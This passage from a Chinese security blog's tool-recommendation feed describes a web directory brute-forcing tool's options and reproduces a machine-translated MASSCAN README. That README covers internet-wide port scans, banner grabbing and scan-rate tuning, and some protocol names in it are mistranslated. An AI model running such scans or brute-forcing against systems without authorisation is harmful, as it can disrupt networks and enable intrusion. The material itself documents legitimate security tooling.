target初始化</p><ul><li></li></ul><pre><code>自动解析处理输入格式( -i,inputTarget)-  IP-  Domain-  URL-  IP/MASK-  IP Start-End</code></pre><ul><li><p>文件读入(-iF,inputLocalFile)</p></li><li></li></ul><p>  bruter初始化</p><ul><li></li></ul><pre><code>加载配置方式()-  读取命令行参数值-  读取配置文件(-lcf,loadConfigFile)</code></pre><ul><li></li></ul><pre><code>递归模式选项(RecursiveScan)-  递归扫描(-rs,recursive_scan)-  需要递归的状态码(-rd,recursive_status_code)-  排除某些目录(-es,exclude_subdirs)</code></pre><ul><li></li></ul><pre><code>扫描模式选项(ScanModeHandler)-    字典模式(-dm,dict_mode)  -  加载单个字典(-dmlsd,dict_mode_load_single_dict)  -  加载多个字典(-dmlmd,dict_mode_load_mult_dict)-    爆破模式(-bm,blast_mode)  -      爆破目录长度范围(必选)    -  最小长度(-bmmin,blast_mode_min)    -  最大长度(-bmmax,blast_mode_max)  -      基于默认字符集    -  基于a-z    -  基于0-9  -  基于自定义字符集(-bmcc,blast_mode_custom_charset)  -  断点续生成payload(-bmrc,blast_mode_resume_charset)-    爬虫模式(-cm,crawl_mode)  -  自定义解析标签(-cmph,crawl_mode_parse_html)(a:href,img:src,form:action,script:src,iframe:src,div:src,frame:src,embed:src)  -  解析robots.txt(-cmpr,crawl_mode_parse_robots)  -  爬虫类动态fuzz扫描(-cmdf,crawl_mode_dynamic_fuzz)-    fuzz模式(-fm,fuzz_mode)  -  fuzz单个字典(-fmlsd,fuzz_mode_load_single_dict)  -  fuzz多个字典(-fmlmd,fuzz_mode_load_mult_dict)  -  fuzz标签(-fml,fuzz_mode_label)</code></pre><ul><li></li></ul><pre><code>请求优化选项(RequestHandler)-  自定义请求超时(-rt,request_timeout)-  自定义请求延时(-rd,request_delay)-  限制单个目标主机协程数扫描(-rl,request_limit)-  限制重试次数(-rmr,request_max_retries)-  http持久连接(-rpc,request_persistent_connect)-  自定义请求方法(-rm,request_method)(get、head)-  302状态处理(-r3,redirection_302)(是否重定向)-    自定义header  -  自定义其他header(-rh,request_headers)(解决需要401认证)  -  自定义ua(-rhua,request_header_ua)  -  自定义cookie(-rhc,request_header_cookie)</code></pre><ul><li></li></ul><pre><code>字典处理选项(PayloadHandler)-  字典处理(payload修改-去斜杠)-  字典处理(payload修改-首字符加斜杠)-  字典处理(payload修改-单词首字母大写)-  字典处理(payload修改-去扩展)-  字典处理(payload修改-去除非字母数字)</code></pre><ul><li></li></ul><pre><code>响应结果处理模块(ResponseHandler)-  跳过大小为x字节的文件(-ss,skip_size)-  自动检测404页面(-ac4p,auto_check_404_page)-  自定义503页面(-c5p,custom_503_page)-    自定义正则匹配响应内容并进行某种操作  -  自定义正则匹配响应(-crp,custom_response_page)  -  某种操作(暂时未定义)-  输出结果为自定义状态码(-rsc,response_status_code)-  输出payload为完整路径(默认输出完成url)-  输出结果展示content-type-  自动去重复保存结果</code></pre><ul><li></li></ul><pre><code>状态处理模块(StatusHandler)-  状态显示(等待开始、进行中、暂停中、异常、完成)-  进度显示-  状态控制(开始、暂停、继续、停止)-  续扫模块(暂未配置)-  断点续扫-  选行续扫</code></pre><ul><li></li></ul><pre><code>日志记录模块(ScanLogHandler)-  扫描日志-  错误日志</code></pre><ul><li></li></ul><pre><code>代理模块(ProxyHandler)-  单个代理(-ps,proxy_server)-  代理池</code></pre><ul><li></li></ul><pre><code>调试模式选项(DebugMode)-  debug(--debug)</code></pre><ul><li></li></ul><pre><code>检查更新选项(CheckUpdate)-  update(--update)</code></pre><h1 id="默认字典文件"><a href="#默认字典文件" class="headerlink" title="默认字典文件"></a>默认字典文件</h1><p>字典文件存放在项目根目录中的<code>data</code>文件夹中</p><ol><li>dict_mode_dict.txt “字典模式”字典，使用dirsearch默认字典</li><li>crawl_mode_suffix.txt “爬虫模式”字典，使用FileSensor默认字典</li><li>fuzz_mode_dir.txt “fuzz模式”字典，使用DirBuster默认字典</li><li>fuzz_mode_ext.txt “fuzz模式”字典，使用常见后缀制作的字典</li><li>dictmult 该目录为“字典模式”默认多字典文件夹，包含：BAK.min.txt(备份文件小字典)，BAK.txt(备份文件大字典)，LEAKS.txt(信息泄露文件字典)</li><li>fuzzmult 该目录为“fuzz模式”默认多字典文件夹，包含：fuzz_mode_dir.txt(默认目录字典)，fuzz_mode_ext.txt(默认后缀字典)</li></ol><h1 id="已知缺陷"><a href="#已知缺陷" class="headerlink" title="已知缺陷"></a>已知缺陷</h1><ol><li>“爬虫模式”只爬取了目标的当前页面，用于生成动态字典。项目将来会将“爬虫模块”与“生成动态字典功能”分离。</li><li>关于bruter.py第517行<code>bar.log.start()</code>出错。解决方案：请安装progressbar2。卸载progressbar。防止导入同名模块。感谢某位表哥提醒。</li></ol><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行命令：</span><br><span class="line">python3 -m pip uninstall progressbar</span><br><span class="line">python3 -m pip install progressbar2</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MASSCAN：海量 IP 端口扫描器</title>
      <link href="/2024/02/29/34-%E6%B5%B7%E9%87%8Fip%E6%89%AB%E6%8F%8F/"/>
      <url>/2024/02/29/34-%E6%B5%B7%E9%87%8Fip%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="github连接"><a href="#github连接" class="headerlink" title="github连接:"></a>github连接:</h2><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h1 id="MASSCAN：海量-IP-端口扫描器"><a href="#MASSCAN：海量-IP-端口扫描器" class="headerlink" title="MASSCAN：海量 IP 端口扫描器"></a>MASSCAN：海量 IP 端口扫描器</h1><p>这是一个互联网规模的端口扫描器。它可以在 5 分钟内扫描整个互联网，从一台机器每秒传输 1000 万个数据包。</p><p>它的用法（参数、输出）类似于<code>nmap</code>最著名的端口扫描器。如有疑问，请尝试其中一项功能——支持对多台计算机进行广泛扫描的功能，但不支持对单台计算机进行深度扫描。</p><p>在内部，它使用异步传输，类似于 <code>scanrand</code>、<code>unicornscan</code>、 和 等端口扫描器<code>ZMap</code>。它更加灵活，允许任意端口和地址范围。</p><p>注意：masscan 使用自己的<strong>专用 TCP/IP 堆栈</strong>。除了简单的端口扫描之外的任何操作都可能导致与本地 TCP/IP 堆栈发生冲突。这意味着您需要使用<code>--src-ip</code>从不同 IP 地址运行的选项，或者用于<code>--src-port</code>配置 Masscan 使用的源端口，然后还配置内部防火墙（如<code>pf</code>或<code>iptables</code>）以将这些端口与操作系统的其余部分隔离。</p><p>该工具是免费的，但请考虑为其开发捐款：比特币钱包地址：1MASSCANaHUiyTtR3bJ2sLGuMw5kDBaj4T</p><h1 id="建筑"><a href="#建筑" class="headerlink" title="建筑"></a>建筑</h1><p>在 Debian/Ubuntu 上，情况如下所示。<code>gcc</code> 除了 C 编译器（例如或）之外，它实际上没有任何依赖项<code>clang</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get --assume-yes install git make gcc</span><br><span class="line">git clone https://github.com/robertdavidgraham/masscan</span><br><span class="line">cd masscan</span><br><span class="line">make</span><br></pre></td></tr></tbody></table></figure><p>这会将程序放入<code>masscan/bin</code>子目录中。要安装它（在 Linux 上），请运行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></tbody></table></figure><p>源代码由许多小文件组成，因此使用多线程构建可以加快构建速度。这需要 Raspberry Pi 上超过 2gig（并且会损坏），因此您可以使用较小的数量，而<code>-j4</code>不是所有可能的线程。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j</span><br></pre></td></tr></tbody></table></figure><p>虽然 Linux 是主要目标平台，但代码在许多其他系统（Windows、macOS 等）上运行良好。以下是一些额外的构建信息：</p><ul><li>Windows w/ Visual Studio：使用 VS10 项目</li><li>Windows w/ MinGW：只需键入<code>make</code></li><li>Windows w/cygwin：无法工作</li><li>Mac OS X /w XCode：使用 XCode4 项目</li><li>Mac OS X /w cmdline：只需键入<code>make</code></li><li>FreeBSD：类型<code>gmake</code><ul><li>其他：尝试将所有文件编译在一起，<code>cc src/*.vs -o bin/masscan</code></li></ul></li></ul><p>在 macOS 上，x86 二进制文件在 ARM 模拟下的运行速度似乎同样快。</p><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>用法类似于<code>nmap</code>. 扫描某个网段的某些端口：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112</span><br></pre></td></tr></tbody></table></figure><p>这会：</p><ul><li>扫描<code>10.x.x.x</code>子网和<code>2603:3001:2d00:da00::x</code>子网</li><li>扫描两个子网上的端口 80 以及范围 8000 到 8100，即总共 102 个端口</li><li>打印输出<code>&lt;stdout&gt;</code>可以重定向到文件</li></ul><p>要查看完整的选项列表，请使用该<code>--echo</code>功能。这将转储当前配置并退出。该输出可以用作程序的输入：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112 --echo &gt; xxx.conf</span><br><span class="line"># masscan -c xxx.conf --rate 1000</span><br></pre></td></tr></tbody></table></figure><h2 id="横幅检查"><a href="#横幅检查" class="headerlink" title="横幅检查"></a>横幅检查</h2><p>Masscan 的功能不仅仅是检测端口是否打开。它还可以在该端口完成与应用程序的TCP连接和交互，以获取简单的“横幅”信息。</p><p>Masscan 支持以下协议的横幅检查：</p><ul><li>文件传输协议</li><li>HTTP协议</li><li>IMAP4</li><li>内存缓存</li><li>POP3</li><li>邮件传输协议</li><li>SSH</li><li>SSL协议</li><li>SMBv1</li><li>SMBv2</li><li>远程登录</li><li>远程开发计划</li><li>虚拟网络控制器</li></ul><p>问题在于，masscan 包含自己的 TCP/IP 堆栈，与运行它的系统分开。当本地系统收到来自被探测目标的 SYN-ACK 时，它会使用 RST 数据包进行响应，该数据包会在 Masscan 抓取横幅之前终止连接。</p><p>防止这种情况的最简单方法是为 Masscan 分配一个单独的 IP 地址。这看起来像以下示例之一：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># masscan 10.0.0.0/8 -p80 --banners --source-ip 192.168.1.200</span><br><span class="line">  # masscan 2a00:1450:4007:810::/112 -p80 --banners --source-ip 2603:3001:2d00:da00:91d7:b54:b498:859d</span><br></pre></td></tr></tbody></table></figure><p>您选择的地址必须位于本地子网上，并且不能被其他系统使用。Masscan 会警告你犯了一个错误，但你可能已经弄乱了另一台机器的通信几分钟，所以要小心。</p><p>在某些情况下，例如 WiFi，这是不可能的。在这些情况下，您可以对 Masscan 使用的端口进行防火墙。这可以防止本地 TCP/IP 堆栈看到该数据包，但 Masscan 仍然可以看到它，因为它绕过了本地堆栈。对于 Linux，这看起来像：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># iptables -A INPUT -p tcp --dport 61000 -j DROP</span><br><span class="line"># masscan 10.0.0.0/8 -p80 --banners --source-port 61000</span><br></pre></td></tr></tbody></table></figure><p>您可能希望选择与 Linux 可能选择的源端口不冲突的端口。您可以通过查看文件来查看 Linux 使用的范围并重新配置该范围：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/ip_local_port_range</span><br></pre></td></tr></tbody></table></figure><p>在最新版本的 Kali Linux（2018 年 8 月）上，该范围是 32768 到 60999，因此您应该选择低于 32768 或 61000 及以上的端口。</p><p>设置<code>iptables</code>规则仅持续到下次重新启动为止。您需要根据您的发行版查找如何保存配置，例如使用<code>iptables-save</code> 和/或<code>iptables-persistent</code>.</p><p>在 Mac OS X 和 BSD 上，也有类似的步骤。要找出要避免的范围，请使用如下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last</span><br></pre></td></tr></tbody></table></figure><p>在 FreeBSD 和较旧的 MacOS 上，使用<code>ipfw</code>命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo ipfw add 1 deny tcp from any to any 40000 in</span><br><span class="line"># masscan 10.0.0.0/8 -p80 --banners --source-port 40000</span><br></pre></td></tr></tbody></table></figure><p>在较新的 MacOS 和 OpenBSD 上，使用<code>pf</code>数据包过滤实用程序。编辑该文件<code>/etc/pf.conf</code>以添加如下行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">block in proto tcp from any to any port 40000:40015</span><br></pre></td></tr></tbody></table></figure><p>然后要启用防火墙，请运行命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pfctl -E    </span><br></pre></td></tr></tbody></table></figure><p>如果防火墙已在运行，则重新启动或使用以下命令重新加载规则：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pfctl -f /etc/pf.conf</span><br></pre></td></tr></tbody></table></figure><p>Windows 不会响应 RST 数据包，因此这些技术都不是必需的。然而，masscan 仍然被设计为使用自己的 IP 地址来最好地工作，因此您应该尽可能以这种方式运行，即使不是绝对必要的。</p><p>其他检查也需要同样的东西，例如检查<code>--heartbleed</code>，这只是横幅检查的一种形式。</p><h2 id="如何扫描整个互联网"><a href="#如何扫描整个互联网" class="headerlink" title="如何扫描整个互联网"></a>如何扫描整个互联网</h2><p>虽然该程序对于较小的内部网络很有用，但它在设计时确实考虑到了整个互联网。它可能看起来像这样：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535</span><br></pre></td></tr></tbody></table></figure><p>扫描整个互联网是不好的。一方面，互联网的某些部分对扫描的反应很糟糕。另一方面，一些网站会跟踪扫描并将您添加到禁止列表中，这将使您无法访问互联网的有用部分。因此，您想要排除很多范围。要将范围列入黑名单或排除范围，您需要使用以下语法：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535 --excludefile exclude.txt</span><br></pre></td></tr></tbody></table></figure><p>这只是将结果打印到命令行。您可能希望将它们保存到文件中。因此，你想要这样的东西：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535 -oX scan.xml</span><br></pre></td></tr></tbody></table></figure><p>这会将结果保存在 XML 文件中，使您可以轻松地将结果转储到数据库或其他内容中。</p><p>但是，这仅以每秒 100 个数据包的默认速率进行，这将花费很长时间来扫描互联网。您需要像这样加快速度：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535 --max-rate 100000</span><br></pre></td></tr></tbody></table></figure><p>这会将速率提高到每秒 100,000 个数据包，这将在每个端口大约 10 小时内扫描整个互联网（减去排除）（如果扫描所有端口则需要 655,360 小时）。</p><p>关于此命令行需要注意的是，这些都是<code>nmap</code> 兼容的选项。此外，<code>nmap</code> 还为您设置了兼容的“隐形”选项：<code>-sS -Pn -n --randomize-hosts --send-eth</code>。同样，XML 文件的格式也受到<code>nmap</code>. 当然，存在很多差异，因为程序的<em>异步性质导致了解决问题的根本不同的方法。</em></p><p>上面的命令行有点麻烦。不必将所有内容都放在命令行上，而是可以将其存储在文件中。上面的设置看起来像这样：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># My Scan</span><br><span class="line">rate =  100000.00</span><br><span class="line">output-format = xml</span><br><span class="line">output-status = all</span><br><span class="line">output-filename = scan.xml</span><br><span class="line">ports = 0-65535</span><br><span class="line">range = 0.0.0.0-255.255.255.255</span><br><span class="line">excludefile = exclude.txt</span><br></pre></td></tr></tbody></table></figure><p>要使用此配置文件，请使用<code>-c</code>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan -c myscan.conf</span><br></pre></td></tr></tbody></table></figure><p>当您重复扫描时，这也使事情变得更容易。</p><p>默认情况下，masscan 首先加载配置文件 <code>/etc/masscan/masscan.conf</code>。任何后续配置参数都会覆盖此默认配置文件中的内容。这就是我放置“excludefile”参数的地方，这样我就不会忘记它。它只是自动工作。</p><h2 id="获取输出"><a href="#获取输出" class="headerlink" title="获取输出"></a>获取输出</h2><p>默认情况下，masscan 会生成相当大的文本文件，但很容易将它们转换为任何其他格式。有五种支持的输出格式：</p><ol><li><p>xml：只需使用参数<code>-oX &lt;filename&gt;</code>. 或者，使用参数<code>--output-format xml</code>和<code>--output-filename &lt;filename&gt;</code>。</p></li><li><p>二进制：这是masscan 内置格式。它生成的文件要小得多，因此当我扫描互联网时，我的磁盘不会填满。但它们需要被解析。命令行选项<code>--readscan</code>将读取二进制扫描文件。<code>--readscan</code>与该选项一起使用<code>-oX</code>将生成结果文件的 XML 版本。</p></li><li><p>grepable：这是 Nmap -oG 输出的实现，可以通过命令行工具轻松解析。只需使用参数即可<code>-oG &lt;filename&gt;</code>。或者，使用参数<code>--output-format grepable</code>和 <code>--output-filename &lt;filename&gt;</code>。</p></li><li><p>json：这会将结果保存为 JSON 格式。只需使用参数即可<code>-oJ &lt;filename&gt;</code>。或者，使用参数<code>--output-format json</code>和 <code>--output-filename &lt;filename&gt;</code>。</p></li><li><p>list：这是一个简单的列表，每行有一个主机和端口对。只需使用参数即可<code>-oL &lt;filename&gt;</code>。或者，使用参数 <code>--output-format list</code>和<code>--output-filename &lt;filename&gt;</code>。格式为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;port state&gt; &lt;protocol&gt; &lt;port number&gt; &lt;IP address&gt; &lt;POSIX timestamp&gt;  </span><br><span class="line">open tcp 80 XXX.XXX.XXX.XXX 1390380064</span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="与Nmap的比较"><a href="#与Nmap的比较" class="headerlink" title="与Nmap的比较"></a>与Nmap的比较</h2><p>在合理的情况下，我们已尽一切努力使该程序为<code>nmap</code>用户所熟悉，即使它有本质上的不同。Masscan 适合对大量机器进行大范围扫描，而 nmap 则设计用于对单台机器或小范围进行密集扫描。</p><p>两个重要的区别是：</p><ul><li>没有要扫描的默认端口，您必须指定<code>-p &lt;ports&gt;</code></li><li><code>nmap</code>目标主机是 IP 地址或简单范围，而不是 DNS 名称，也不能使用时髦的子网范围（例如<code>10.0.0-255.0-255</code>）。</li></ul><p>您可以认为<code>masscan</code>永久启用以下设置：</p><ul><li><code>-sS</code>：这仅进行 SYN 扫描（目前，将来会改变）</li><li><code>-Pn</code>：不首先 ping 主机，这是异步操作的基础</li><li><code>-n</code>: 没有发生 DNS 解析</li><li><code>--randomize-hosts</code>：始终完全随机扫描，您无法更改此设置</li><li><code>--send-eth</code>：使用原始发送<code>libpcap</code></li></ul><p>如果您想要其他兼容设置的列表<code>nmap</code>，请使用以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan --nmap</span><br></pre></td></tr></tbody></table></figure><h2 id="传输速率（重要！！）"><a href="#传输速率（重要！！）" class="headerlink" title="传输速率（重要！！）"></a>传输速率（重要！！）</h2><p>这个程序发出数据包的速度非常快。在 Windows 上或虚拟机上，它每秒可以处理 300,000 个数据包。在 Linux（无虚拟化）上，它每秒处理 160 万个数据包。这速度足以融化大多数网络。</p><p>请注意，它只会融化您自己的网络。它将目标 IP 地址随机化，这样就不会淹没任何远程网络。</p><p>默认情况下，速率设置为 100 个数据包/秒。要将速率提高到一百万，请使用类似<code>--rate 1000000</code>.</p><p>扫描 IPv4 Internet 时，您将扫描大量子网，因此即使有大量数据包发出，每个目标子网也会收到少量传入数据包。</p><p>然而，通过 IPv6 扫描，您往往会关注具有数十亿个地址的单个目标子网。因此，您的默认行为将压垮目标网络。网络经常在 Masscan 产生的负载下崩溃。</p><h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><p>本节描述该程序的主要设计问题。</p><h2 id="代码布局"><a href="#代码布局" class="headerlink" title="代码布局"></a>代码布局</h2><p>正如您所期望的，该文件<code>main.c</code>包含该函数。<code>main()</code>它还包含<code>transmit_thread()</code>和<code>receive_thread()</code>函数。这些函数已被故意扁平化并带有大量注释，以便您只需逐行浏览每个函数即可阅读程序的设计。</p><h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p>这是一个<em>异步</em>设计。换句话说，它的作用相当于网络服务器的<code>nmap</code>作用。它具有独立的发送和接收线程，这些线程在很大程度上彼此独立。这与、、 和中发现的设计类型相同。<code>nginx``Apache``scanrand``unicornscan``ZMap</code></p><p>由于它是异步的，因此它的运行速度与底层数据包传输允许的速度一样快。</p><h2 id="随机化"><a href="#随机化" class="headerlink" title="随机化"></a>随机化</h2><p>Masscan 与其他扫描仪之间的一个关键区别在于它随机化目标的方式。</p><p>基本原则是有一个索引变量，该变量从零开始，每次探测时递增 1。在 C 代码中，这表示为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; range; i++) {</span><br><span class="line">    scan(i);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们必须将索引转换为 IP 地址。假设您想要扫描所有“私有”IP 地址。那将是范围表，例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.0/16</span><br><span class="line">10.0.0.0/8</span><br><span class="line">172.16.0.0/12</span><br></pre></td></tr></tbody></table></figure><p>在此示例中，前 64k 索引附加到 192.168.xx 以形成目标地址。然后，接下来的 1600 万被附加到 10.xxx 该范围内的剩余索引被应用到 172.16.xx</p><p>在此示例中，我们只有三个范围。当扫描整个互联网时，我们实际上有超过 100 个范围。那是因为您必须将许多子范围列入黑名单或排除。这会将所需的范围分成数百个较小的范围。</p><p>这导致代码中最慢的部分之一。我们每秒传输 1000 万个数据包，并且必须将每个探测器的索引变量转换为 IP 地址。我们通过在少量内存中进行“二分搜索”来解决这个问题。在此数据包速率下，缓存效率开始超过算法效率。理论上有很多更有效的技术，但它们都需要大量的内存，因此在实践中速度会变慢。</p><p>我们将把索引转换为 IP 地址的函数称为函数<code>pick()</code>。在使用中，它看起来像：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; range; i++) {</span><br><span class="line">    ip = pick(addresses, i);</span><br><span class="line">    scan(ip);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Masscan 不仅支持 IP 地址范围，还支持端口范围。这意味着我们需要从索引变量中选择 IP 地址和端口。这相当简单：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">range = ip_count * port_count;</span><br><span class="line">for (i = 0; i &lt; range; i++) {</span><br><span class="line">    ip   = pick(addresses, i / port_count);</span><br><span class="line">    port = pick(ports,     i % port_count);</span><br><span class="line">    scan(ip, port);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这导致代码的另一个昂贵部分。在 x86 CPU 上，除法/取模指令大约需要 90 个时钟周期，即 30 纳秒。当以 1000 万个数据包/秒的速率传输时，每个数据包只有 100 纳秒。我认为没有办法更好地优化它。但幸运的是，两个这样的操作可以同时执行，因此执行其中两个操作（如上所示）并不比执行一个更昂贵。</p><p>对于上述性能问题其实有一些简单的优化，但是它们都依赖于<code>i++</code>索引变量通过扫描逐一增加的事实。实际上，我们需要随机化这个变量。我们需要随机化所扫描的 IP 地址的顺序，否则我们将炸掉那些不是为这种速度水平构建的目标网络。我们需要将流量均匀地分布在目标上。</p><p>我们随机化的方式很简单，就是对索引变量进行加密。根据定义，加密是随机的，并在原始索引变量和输出之间创建 1 对 1 的映射。这意味着当我们线性遍历该范围时，输出 IP 地址是完全随机的。在代码中，这看起来像：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">range = ip_count * port_count;</span><br><span class="line">for (i = 0; i &lt; range; i++) {</span><br><span class="line">    x = encrypt(i);</span><br><span class="line">    ip   = pick(addresses, x / port_count);</span><br><span class="line">    port = pick(ports,     x % port_count);</span><br><span class="line">    scan(ip, port);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这也有很大的成本。由于范围的大小是不可预测的，而不是 2 的偶次幂，因此我们不能使用廉价的二进制技术，例如 AND (&amp;) 和 XOR (^)。相反，我们必须使用昂贵的运算，例如 MODULUS (%)。在我当前的基准测试中，加密变量需要 40 纳秒。</p><p>这种架构允许许多很酷的功能。例如，它支持“分片”。您可以设置 5 台机器，每台机器执行五分之一的扫描或 <code>range / shard_count</code>. 分片可以是多台机器，也可以是同一台机器上的多个网络适配器，甚至（如果您愿意）同一网络适配器上的多个 IP 源地址。</p><p>或者，您可以使用加密功能的“种子”或“密钥”，以便每次扫描时都会得到不同的顺序，例如<code>x = encrypt(seed, i)</code>。</p><p>我们还可以通过退出程序来暂停扫描，只需记住 的当前值<code>i</code>，然后重新启动即可。我在开发过程中经常这样做。我发现我的互联网扫描出了问题，所以我点击停止扫描，然后在修复错误后重新启动扫描。</p><p>另一个功能是重传/重试。数据包有时会在 Internet 上丢失，因此您可以连续发送两个数据包。然而，丢弃一个数据包的东西可能会丢弃紧随其后的数据包。因此，您希望间隔大约 1 秒发送副本。这很简单。我们已经有一个“速率”变量，它是我们正在传输的每秒数据包的数量，因此重传函数只是用作<code>i + rate</code> 索引。这几天我要研究一下互联网，区分一下“背靠背”、“1秒”、“10秒”、“1分钟”这样的重传，看看有没有被丢弃的东西有什么区别。</p><h2 id="C10-可扩展性"><a href="#C10-可扩展性" class="headerlink" title="C10 可扩展性"></a>C10 可扩展性</h2><p>异步技术被称为“c10k 问题”的解决方案。Masscan 专为下一级别的可扩展性“C10M 问题”而设计。</p><p>C10M的解决方案是绕过内核。Masscan 中存在三种主要的内核绕过方式：</p><ul><li>自定义网络驱动程序</li><li>用户模式 TCP 堆栈</li><li>用户模式同步</li></ul><p>Masscan 可以使用 PF_RING DNA 驱动程序。该驱动程序 DMA 数据包直接从用户模式内存发送到网络驱动程序，零内核参与。这样，即使 CPU 速度较慢，软件也能以硬件允许的最大速率传输数据包。如果您在计算机中放置 8 个 10 Gbps 网卡，这意味着它可以以每秒 1 亿个数据包的速度传输。</p><p>Masscan 有自己的内置 TCP 堆栈，用于从 TCP 连接抓取横幅。这意味着它可以轻松支持 1000 万个并发 TCP 连接，当然前提是计算机有足够的内存。</p><p>Masscan 没有“互斥体”。现代互斥体（又名 futexes）主要是用户模式的，但它们有两个问题。第一个问题是它们导致缓存行在 CPU 之间快速来回跳动。第二个是，当存在争用时，它们会对内核进行系统调用，这会降低性能。程序快速路径上的互斥体严重限制了可伸缩性。相反，Masscan 使用“环”来同步事物，例如当接收线程中的用户模式 TCP 堆栈需要传输数据包而不干扰传输线程时。</p><h2 id="可移植性"><a href="#可移植性" class="headerlink" title="可移植性"></a>可移植性</h2><p>该代码在 Linux、Windows 和 Mac OS X 上运行良好。所有重要部分均采用标准 C (C90) 语言。因此，它在 Visual Studio 上使用 Microsoft 的编译器进行编译，在 Mac OS X 上使用 Clang/LLVM 编译器进行编译，在 Linux 上使用 GCC 进行编译。</p><p>Windows 和 Mac 并未针对数据包传输进行调整，每秒只能传输约 300,000 个数据包，而 Linux 每秒可以传输 1,500,000 个数据包。无论如何，这可能比你想要的要快。</p><h2 id="安全码"><a href="#安全码" class="headerlink" 